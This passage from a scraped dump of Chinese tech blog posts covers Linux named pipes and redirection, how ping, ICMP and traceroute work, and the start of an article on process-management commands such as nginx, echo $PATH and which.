data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67025e5e4629529093-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67025e5e4629529093-1\"><span class=\"crayon-i\">mknod</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">pipe</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>要重定向任何命令的标准输出到其它命令，请使用 <code>&gt;</code> 符号。要重定向任何命令的标准输入，请使用 &lt; <code>符号。</code></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e3d27db16394809cf34d6b6a978c73f4.png\" alt=\"\"></p>\n<p>如上所示，<code>ls -al</code> 命令的输出被重定向到 <code>contents.txt</code> 并插入到文件中。类似地，<code>tail</code> 命令的输入通过 &lt; <code>符号从 <code>contents.txt</code> 读取。</code></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/55c8812ac4c408cd865f535200ce69c1.png\" alt=\"\"></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/1cecee49e0d70b57db6356204b09b1ae.png\" alt=\"\"></p>\n<p>这里，我们创建了一个命名管道 <code>my-named-pipe</code>，并将 <code>ls -al</code> 命令的输出重定向到命名管道。我们可以打开一个新的 shell 会话并 <code>cat</code> 命名管道的内容，如前所述，它显示了 <code>ls -al</code> 命令的输出。请注意，命名管道的大小为零，并有一个标志 “p”。</p>\n<p>因此，下次你在 Linux 终端上使用命令并在命令之间移动数据时，希望管道使这个过程快速简便。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114379\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114379votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114379\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/ebb531e935e6b4104066e717fdb1714374f9be55.jpg"}
{"title": "当你「ping 一下」的时候，你知道它背后的逻辑吗？", "url": "http://blog.jobbole.com/114391/", "create_date": "2018/09/16", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/a1dc9868123d4debdf8ceb3c6bf4aae7.jpeg"], "url_object_id": "1bfd52dcd3b27d6fb73b7f34e1cdfbfe", "praise_nums": 1, "fav_nums": 2, "comment_nums": 1, "tags": "IT技术,ping,网络", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://mp.weixin.qq.com/s/uN21-7jda-GwiUTZxJ8VeA\">奎哥（个人公号：不止思考）</a>   </div><section><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a1dc9868123d4debdf8ceb3c6bf4aae7.jpeg\">我们在遇到网络不通的情况，大家都知道去 ping 一下，看一下网络状况。<br>\n那你知道「ping」命令后背的逻辑是什么吗？知道它是如何实现的吗？\n<h4>一、「ping」命令的作用和原理？</h4>\n<p>简单来说，「ping」是用来探测本机与网络中另一主机之间是否可达的命令，如果两台主机之间ping不通，则表明这两台主机不能建立起连接。ping是定位网络通不通的一个重要手段。</p>\n<p>ping 命令是基于 ICMP 协议来工作的，「 ICMP 」全称为 Internet 控制报文协议（ Internet Control Message Protocol）。ping 命令会发送一份ICMP回显请求报文给目标主机，并等待目标主机返回ICMP回显应答。因为ICMP协议会要求目标主机在收到消息之后，必须返回ICMP应答消息给源主机，如果源主机在一定时间内收到了目标主机的应答，则表明两台主机之间网络是可达的。</p>\n<p>举一个例子来描述「ping」命令的工作过程：</p>\n<ol>\n<li>假设有两个主机，主机A（192.168.0.1）和主机B（192.168.0.2），现在我们要监测主机A和主机B之间网络是否可达，那么我们在主机A上输入命令：ping 192.168.0.2</li>\n<li>此时，ping命令会在主机A上构建一个 ICMP的请求数据包（数据包里的内容后面再详述），然后 ICMP协议会将这个数据包以及目标IP（192.168.0.2）等信息一同交给IP层协议。</li>\n<li>IP层协议得到这些信息后，将源地址（即本机IP）、目标地址（即目标IP：192.168.0.2）、再加上一些其它的控制信息，构建成一个IP数据包。</li>\n<li>IP数据包构建完成后，还不够，还需要加上MAC地址，因此，还需要通过ARP映射表找出目标IP所对应的MAC地址。当拿到了目标主机的MAC地址和本机MAC后，一并交给数据链路层，组装成一个数据帧，依据以太网的介质访问规则，将它们传送出出去。</li>\n<li>当主机B收到这个数据帧之后，会首先检查它的目标MAC地址是不是本机，如果是就接收下来处理，接收之后会检查这个数据帧，将数据帧中的IP数据包取出来，交给本机的IP层协议，然后IP层协议检查完之后，再将ICMP数据包取出来交给ICMP协议处理，当这一步也处理完成之后，就会构建一个ICMP应答数据包，回发给主机A</li>\n<li>在一定的时间内，如果主机A收到了应答包，则说明它与主机B之间网络可达，如果没有收到，则说明网络不可达。除了监测是否可达以外，还可以利用应答时间和发起时间之间的差值，计算出数据包的延迟耗时。</li>\n</ol>\n<p>通过ping的流程可以发现，ICMP协议是这个过程的基础，是非常重要的，因此下面就把ICMP协议再详细解释一下。</p>\n<h4>二、什么是「 ICMP 」？</h4>\n<p>我们知道，ping命令是基于ICMP协议来实现的。那么我们再来看下图，就明白了ICMP协议又是通过IP协议来发送的，即ICMP报文是封装在IP包中。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/9914d7e09e99c91bbd01b7319ae69dd5.png\"></p>\n<p>IP协议是一种无连接的，不可靠的数据包协议，它并不能保证数据一定被送达，那么我们要保证数据送到就需要通过其它模块来协助实现，这里就引入的是ICMP协议。</p>\n<p>当传送的IP数据包发送异常的时候，ICMP就会将异常信息封装在包内，然后回传给源主机。</p>\n<p>将上图再细拆一下可见：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/07fec26e1798982f64ce024849953323.png\"></p>\n<p>继续将ICMP协议模块细拆:</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/808e2c5410952ce5f6febde757a8db0c.png\"></p>\n<p>由图可知，ICMP数据包由8bit的类型字段和8bit的代码字段以及16bit的校验字段再加上选项数据组成。</p>\n<p>ICMP协议大致可分为两类：</p>\n<ul>\n<li><strong>查询报文类型</strong></li>\n<li><strong>差错报文类型</strong></li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/26a60a3588ca544272e90dc0d12ec0ba.png\"></p>\n<ol>\n<li><strong>查询报文类型</strong>：</li>\n</ol>\n<p>查询报文主要应用于：ping查询、子网掩码查询、时间戳查询等等。</p>\n<p>上面讲到的ping命令的流程其实就对应ICMP协议查询报文类型的一种使用。在主机A构建ICMP请求数据包的时候，其ICMP的类型字段中使用的是 8 （回送请求），当主机B构建ICMP应答包的时候，其ICMP类型字段就使用的是 0 （回送应答），更多类型值参考上表。</p>\n<p>对 查询报文类型 的理解可参考一下文章最开始讲的ping流程，这里就不做赘述。</p>\n<ol start=\"2\">\n<li><strong>差错报文类型</strong>：</li>\n</ol>\n<p>差错报文主要产生于当数据传送发送错误的时候。<br>\n它包括：目标不可达（网络不可达、主机不可达、协议不可达、端口不可达、禁止分片等）、超时、参数问题、重定向（网络重定向、主机重定向等）等等。</p>\n<p>差错报文通常包含了引起错误的IP数据包的第一个分片的IP首部，加上该分片数据部分的前8个字节。<br>\n当传送IP数据包发生错误的时候（例如 主机不可达），ICMP协议就会把错误信息封包，然后传送回源主机，那么源主机就知道该怎么处理了。</p>\n<p>那是不是只有遇到错误的时候才能使用 差错报文类型 呢？也不一定。</p>\n<p>Traceroute 就是一个例外，Traceroute是用来侦测源主机到目标主机之间所经过路由情况的常用工具。Traceroute 的原理就是利用ICMP的规则，制造一些错误的事件出来，然后根据错误的事件来评估网络路由情况。</p>\n<p>具体做法就是：</p>\n<p>Traceroute会设置特殊的TTL值，来追踪源主机和目标主机之间的路由数。首先它给目标主机发送一个 TTL=1 的UDP数据包，那么这个数据包一旦在路上遇到一个路由器，TTL就变成了0（TTL规则是每经过一个路由器都会减1），因为TTL=0了，所以路由器就会把这个数据包丢掉，然后产生一个错误类型（超时）的ICMP数据包回发给源主机，也就是差错包。这个时候源主机就拿到了第一个路由节点的IP和相关信息了。</p>\n<p>接着，源主机再给目标主机发一个 TTL=2 的UDP数据包，依旧上述流程走一遍，就知道第二个路由节点的IP和耗时情况等信息了。</p>\n<p>如此反复进行，Traceroute就可以拿到从主机A到主机B之间所有路由器的信息了。</p>\n<p>但是有个问题是，如果数据包到达了目标主机的话，即使目标主机接收到TTL值为1的IP数据包，它也是不会丢弃该数据包的，也不会产生一份超时的ICMP回发数据包的，因为数据包已经达到了目的地嘛。那我们应该怎么认定数据包是否达到了目标主机呢？</p>\n<p>Traceroute的方法是在源主机发送UDP数据包给目标主机的时候，会设置一个不可能达到的目标端口号（例如大于30000的端口号），那么当这个数据包真的到达目标主机的时候，目标主机发现没有对应的端口号，因此会产生一份“端口不可达”的错误ICMP报文返回给源主机。</p>\n<p>可见Traceroute的原理确实很取巧，很有趣。</p>\n<p>以上，就是对ping的基本原理以及ICMP协议的基本讲解了，欢迎大家一起交流。</p>\n</section>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114391\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114391votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114391\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/e163dd0789f1114653a331123e2c76d7c34f8ebd.jpg"}
{"title": "有效管理进程的 8 个 Linux 命令", "url": "http://blog.jobbole.com/114393/", "create_date": "2018/09/18", "front_image_url": ["https://dn-linuxcn.qbox.me/data/attachment/album/201809/16/225342dggc8idpid9mpp85.png"], "url_object_id": "5c4fae15774a636264c6d4abecdfe8ff", "praise_nums": 1, "fav_nums": 2, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/9/linux-commands-process-management\">Alan Formy-duval</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-10020-1.html\">Linux中国/heguangzhi</a>   </div><p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201809/16/225342dggc8idpid9mpp85.png\" alt=\"\"></p>\n<p>一般来说，应用程序进程的生命周期有三种主要状态：启动、运行和停止。如果我们想成为称职的管理员，每个状态都可以而且应该得到认真的管理。这八个命令可用于管理进程的整个生命周期。</p>\n<h3 id=\"toc_1\">启动进程</h3>\n<p>启动进程的最简单方法是在命令行中键入其名称，然后按回车键。如果要启动 Nginx web 服务器，请键入 <code>nginx</code> 。也许您只是想看看其版本。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d1177088927680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ nginx\r\n\r\nalan@workstation:~$ nginx -v\r\nnginx version: nginx/1.14.0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1177088927680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1177088927680-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1177088927680-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1177088927680-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d1177088927680-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1177088927680-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6700d1177088927680-3\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1177088927680-4\"><span class=\"crayon-e\">nginx </span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1.14.0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">查看您的可执行路径</h3>\n<p>以上启动进程的演示是假设可执行文件位于您的可执行路径中。理解这个路径是可靠地启动和管理进程的关键。管理员通常会为他们想要的目的定制这条路径。您可以使用 <code>echo $PATH</code> 查看您的可执行路径。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d1180931227949\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ echo $PATH\r\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1180931227949-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1180931227949-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d1180931227949-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">PATH</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1180931227949-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h4 id=\"toc_3\">WHICH</h4>\n<p>使用 <code>which</code> 命令查看可执行文件的完整路径。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d1184481900605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ which nginx\r\n/opt/nginx/bin/nginx</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1184481900605-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1184481900605-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d1184481900605-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">which </span><span class=\"crayon-v\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1184481900605-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">opt</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>我将使用流行的 web 服务器软件 Nginx 作为我的例子。假设安装了 Nginx。如果执行 <code>which nginx</code> 的命令什么也不返回，那么是找不到 Nginx 了，因为它只搜索您指定的可执行路径。有三种方法可以补救一个进程不能简单地通过名字启动的情况。首先是键入完整路径 —— 虽然，我不情愿输入全部路径，您会吗？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d1188231479232\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ /home/alan/web/prod/nginx/sbin/nginx -v\r\nnginx version: nginx/1.14.0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d1188231479232-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d1188231479232-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d1188231479232-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">alan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">web</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">prod</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1188231479232-2\"><span class=\"crayon-e\">nginx </span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span 